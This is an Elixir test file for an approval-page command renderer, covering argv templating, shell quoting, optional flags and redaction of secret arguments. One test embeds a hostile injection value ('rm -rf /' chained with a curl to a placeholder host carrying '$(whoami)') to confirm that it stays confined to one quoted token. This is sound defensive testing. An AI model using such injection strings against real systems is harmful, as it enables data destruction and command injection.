defmodule Emisar.Catalog.CommandPreviewTest do
  @moduledoc """
  The approval-page command renderer — a port of the runner's argv templating
  + shell quoting + secret masking. These assertions pin it to the runner's
  behaviour so the preview an operator approves against matches what actually
  runs (mismatched semantics would show a misleading command on the highest-
  stakes screen). Parity cases name the Go test they mirror.
  """
  use ExUnit.Case, async: true
  alias Emisar.Catalog.CommandPreview
  alias Emisar.Catalog.PublishedRegistry.Action
  alias Emisar.RawJSON

  defp exec_action(binary, argv, specs \\ []) do
    %Action{
      id: "pack.action",
      title: "Action",
      kind: "exec",
      risk: "low",
      command: %{binary: binary, argv: argv},
      args: specs
    }
  end

  describe "render/3" do
    test "substitutes scalar args and fills declared defaults for omitted ones" do
      action =
        exec_action(
          "cloud-init",
          ["single", "--name={{ args.module }}", "--frequency={{ args.frequency }}"],
          [%{"name" => "frequency", "default" => "always"}]
        )

      assert CommandPreview.render(action, %{"module" => "ssh"}) ==
               {:ok, "cloud-init single --name=ssh --frequency=always"}
    end

    test "renders a literal (zero-arg) command with no placeholders" do
      action = exec_action("cloud-init", ["status", "--long"])

      assert CommandPreview.render(action, %{}) == {:ok, "cloud-init status --long"}
    end

    # Mirrors expressions.TestRenderArgv_ArrayExpansion.
    test "expands a whole-expression array element into multiple argv tokens" do
      action = exec_action("grep", ["-e", "pattern", "{{ args.paths }}"])

      assert CommandPreview.render(action, %{"paths" => ["/a", "/b c"]}) ==
               {:ok, "grep -e pattern /a '/b c'"}
    end

    # Mirrors expressions.TestRender_BooleanFormatting.
    test "formats integer and boolean args the runner's way" do
      action = exec_action("tool", ["--count={{ args.n }}", "--force={{ args.force }}"])

      assert CommandPreview.render(action, %{"n" => 3, "force" => true}) ==
               {:ok, "tool --count=3 --force=true"}
    end

    # Mirrors expressions.TestRenderArgv_PreservesJSONNumber: the exact token
    # the caller signed, never a re-spelled float.
    test "formats exact JSON numbers without rounding or changing exponent spelling" do
      action = exec_action("tool", ["--ratio={{ args.ratio }}", "{{ args.scale }}"])
      {:ok, args} = RawJSON.decode_object(~s({"ratio":0.1234567890123456789,"scale":1e3}))

      assert CommandPreview.render(action, args) ==
               {:ok, "tool --ratio=0.1234567890123456789 1e3"}
    end

    # Go renders every float through strconv.FormatFloat(v, 'f', -1, 64):
    # shortest round-tripping digits, always fixed notation, and no ".0" on an
    # integer-valued float. Elixir's shortest form spells these with an
    # exponent, so the point has to be shifted back to match byte-for-byte.
    test "formats floats in Go's fixed notation at extreme magnitudes" do
      action = exec_action("tool", ["{{ args.v }}"])

      assert CommandPreview.render(action, %{"v" => 3.0}) == {:ok, "tool 3"}
      assert CommandPreview.render(action, %{"v" => 1500.0}) == {:ok, "tool 1500"}

      assert CommandPreview.render(action, %{"v" => 1.0e20}) ==
               {:ok, "tool 100000000000000000000"}

      assert CommandPreview.render(action, %{"v" => 1.0e-10}) == {:ok, "tool 0.0000000001"}
      assert CommandPreview.render(action, %{"v" => -2.5e-7}) == {:ok, "tool -0.00000025"}

      assert CommandPreview.render(action, %{"v" => 0.30000000000000004}) ==
               {:ok, "tool 0.30000000000000004"}
    end

    test "shell-quotes values with spaces or metacharacters" do
      action = exec_action("sh", ["-c", "{{ args.script }}"])

      assert CommandPreview.render(action, %{"script" => "echo hi; rm x"}) ==
               {:ok, "sh -c 'echo hi; rm x'"}
    end

    # The runner's shellQuote allowlist is ASCII by construction, so any
    # non-ASCII rune leaves the bare form.
    test "quotes a non-ASCII value the runner would never leave bare" do
      action = exec_action("tool", ["{{ args.name }}"])

      assert CommandPreview.render(action, %{"name" => "café"}) == {:ok, "tool 'café'"}
    end

    test "escapes an embedded single quote the way the runner does" do
      action = exec_action("tool", ["{{ args.name }}"])

      assert CommandPreview.render(action, %{"name" => "it's"}) == {:ok, ~S(tool 'it'\''s')}
    end

    test "renders an empty-string arg as a quoted empty token" do
      action = exec_action("tool", ["{{ args.empty }}"])

      assert CommandPreview.render(action, %{"empty" => ""}) == {:ok, "tool ''"}
    end

    # Mirrors expressions.TestRenderArgv_OptionalFlag_DropAndKeep: an optional
    # expression drops its WHOLE argv element rather than passing an empty flag
    # that would clobber the target binary's own ambient default.
    test "drops an argv element whose optional expression is absent or empty" do
      action = exec_action("nomad", ["job", "status", "-namespace={{ args.ns? }}", "web"])

      assert CommandPreview.render(action, %{}) == {:ok, "nomad job status web"}
      assert CommandPreview.render(action, %{"ns" => ""}) == {:ok, "nomad job status web"}

      assert CommandPreview.render(action, %{"ns" => "prod"}) ==
               {:ok, "nomad job status -namespace=prod web"}
    end

    test "drops a whole-expression optional element and expands it when set" do
      action = exec_action("cmd", ["{{ args.tags? }}", "tail"])

      assert CommandPreview.render(action, %{"tags" => []}) == {:ok, "cmd tail"}
      assert CommandPreview.render(action, %{}) == {:ok, "cmd tail"}

      assert CommandPreview.render(action, %{"tags" => ["-a", "-b"]}) ==
               {:ok, "cmd -a -b tail"}
    end

    test "keeps a zero or false optional value — neither is empty" do
      action = exec_action("cmd", ["-n={{ args.n? }}", "-f={{ args.f? }}"])

      assert CommandPreview.render(action, %{"n" => 0, "f" => false}) ==
               {:ok, "cmd -n=0 -f=false"}
    end

    test "honors a spaced optional marker" do
      action = exec_action("cmd", ["-x={{ args.x ? }}"])

      assert CommandPreview.render(action, %{"x" => ""}) == {:ok, "cmd"}
      assert CommandPreview.render(action, %{"x" => "on"}) == {:ok, "cmd -x=on"}
    end

    # Mirrors expressions.TestRenderArgv_OptionalFlag_HostileValueStaysOneToken.
    test "keeps a hostile optional value contained to its own quoted token" do
      hostile = "a; rm -rf / && curl h/$(whoami) # {{ args.other }}\n-injected"
      action = exec_action("nomad", ["-namespace={{ args.ns? }}", "status"])

      assert CommandPreview.render(action, %{"ns" => hostile}) ==
               {:ok, "nomad '-namespace=" <> hostile <> "' status"}
    end

    # Mirrors expressions.TestRenderArgv_NonOptional_EmptyStillRendersToken:
    # "?" opts an element into dropping; without it nothing changes.
    test "a non-optional empty value still renders its token" do
      action = exec_action("cmd", ["-namespace={{ args.ns }}"])

      assert CommandPreview.render(action, %{"ns" => ""}) == {:ok, "cmd -namespace="}
    end

    test "errors when a referenced arg is absent (no default) rather than guess" do
      action = exec_action("tool", ["{{ args.missing }}"])

      assert CommandPreview.render(action, %{}) == :error
    end

    # Mirrors expressions.TestRenderArgv_OptionalBadReferenceStillRejected and
    # TestRender_RejectsNonArgsRoot / TestRender_RejectsFunctionCalls — "?" opts
    # into absence-tolerance, never into skipping validation of the reference.
    test "errors on a reference the runner's grammar does not accept" do
      for template <- ["{{ steps.x? }}", "{{ steps.x.stdout }}", "{{ contains(args.a, 'b') }}"] do
        action = exec_action("tool", [template])

        assert CommandPreview.render(action, %{"a" => "b"}) == :error,
               "expected #{template} to be rejected"
      end
    end

    test "errors on an unterminated template" do
      action = exec_action("tool", ["--x={{ args.a"])

      assert CommandPreview.render(action, %{"a" => "b"}) == :error
    end

    test "errors when a value can't be formatted as a scalar" do
      action = exec_action("tool", ["{{ args.obj }}"])

      assert CommandPreview.render(action, %{"obj" => %{"nested" => 1}}) == :error
    end

    test "errors for an action with no command (a script-kind action)" do
      action = %Action{id: "pack.deep", title: "Deep", kind: "script", risk: "low"}

      assert CommandPreview.render(action, %{}) == :error
    end

    test "masks a sensitive arg's value even when embedded in a larger flag" do
      action =
        exec_action("curl", ["-H", "Authorization: Bearer {{ args.token }}"], [
          %{"name" => "token", "sensitive" => true}
        ])

      assert CommandPreview.render(action, %{"token" => "sk-secret"}) ==
               {:ok, "curl -H 'Authorization: Bearer [REDACTED]'"}
    end

    # Mirrors engine.TestEngine_SensitiveListRedactedPerElement: the list
    # expands into separate tokens, so masking only the whole form would leave
    # every element in the one command string that leaves the host.
    test "masks every element of a sensitive list arg" do
      action =
        exec_action("wg", ["--iface", "{{ args.iface }}", "{{ args.keys }}"], [
          %{"name" => "iface"},
          %{"name" => "keys", "sensitive" => true}
        ])

      args = %{"iface" => "wg0", "keys" => ["s3cr3t-alpha", "s3cr3t-beta"]}

      assert CommandPreview.render(action, args) ==
               {:ok, "wg --iface wg0 '[REDACTED]' '[REDACTED]'"}
    end

    # Mirrors engine.TestEngine_OverlappingSensitiveValuesRedactedLongestFirst:
    # masking the short secret first would leave "123" of the long one behind.
    test "masks overlapping secrets longest first" do
      action =
        exec_action("tool", ["--token={{ args.long }}"], [
          %{"name" => "short", "sensitive" => true},
          %{"name" => "long", "sensitive" => true}
        ])

      assert CommandPreview.render(action, %{"short" => "abc", "long" => "abc123"}) ==
               {:ok, "tool '--token=[REDACTED]'"}
    end

    # Mirrors engine.TestEngine_SecretInsideMarkerDoesNotCorruptRedaction: a
    # per-secret fold re-scans text it already masked, so a secret that is a
    # substring of the marker rewrote the marker to "[R[REDACTED]ACTED]" —
    # mangling the line an operator approves against and spelling out the value.
    test "a secret that is a substring of the marker does not corrupt it" do
      action =
        exec_action("tool", ["--token={{ args.token }}", "--mode={{ args.mode }}"], [
          %{"name" => "token", "sensitive" => true},
          %{"name" => "mode", "sensitive" => true}
        ])

      assert CommandPreview.render(action, %{"token" => "s3cr3t-alpha", "mode" => "ED"}) ==
               {:ok, "tool '--token=[REDACTED]' '--mode=[REDACTED]'"}
    end

    test "masks a value only the run's snapshot marks sensitive" do
      action = exec_action("cloud-init", ["single", "--name={{ args.module }}"])

      assert CommandPreview.render(action, %{"module" => "secret-module"}, ["module"]) ==
               {:ok, "cloud-init single '--name=[REDACTED]'"}
    end

    test "masks a default the action itself declares sensitive" do
      action =
        exec_action("tool", ["--token={{ args.token }}"], [
          %{"name" => "token", "default" => "baked-in-secret", "sensitive" => true}
        ])

      assert CommandPreview.render(action, %{}) == {:ok, "tool '--token=[REDACTED]'"}
    end
  end
end
